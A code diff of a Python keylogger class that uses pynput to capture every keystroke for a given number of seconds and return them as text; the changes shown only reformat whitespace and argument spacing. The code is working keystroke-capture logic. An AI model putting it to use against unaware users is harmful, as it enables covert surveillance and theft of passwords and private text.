@@ -1,18 +1,21 @@
 from pynput.keyboard import Listener, Key
 import time
 
+
 class KeyLogger:
     """An class for managing keyboard
     """
+
     def __init__(self):
         """Init keylogger
+
         """
         self.keys = ''
         self.listener = None
-        
- 
+
     def on_press(self, key):
         """Convert a raw key to meaningful key
+
         :param key: (str)
         """
         if type(key) == Key:
@@ -32,17 +35,18 @@ class KeyLogger:
                 else:
                     self.keys += chr(key.vk)
             else:
-                if ord(key.char) < 32: 
+                if ord(key.char) < 32:
                     self.keys += chr(key.vk)
                 else:
                     self.keys += key.char
-    
-    def hook_in(self, Xtime): 
+
+    def hook_in(self, Xtime):
         """Listen raw keys from user keyboard
+
         :param Xtime: (int)
         :return: (str) a list of raw keys
         """
-        self.listener = Listener(on_press = self.on_press)
+        self.listener = Listener(on_press=self.on_press)
         self.listener.start()
         time.sleep(Xtime)
         self.listener.stop()
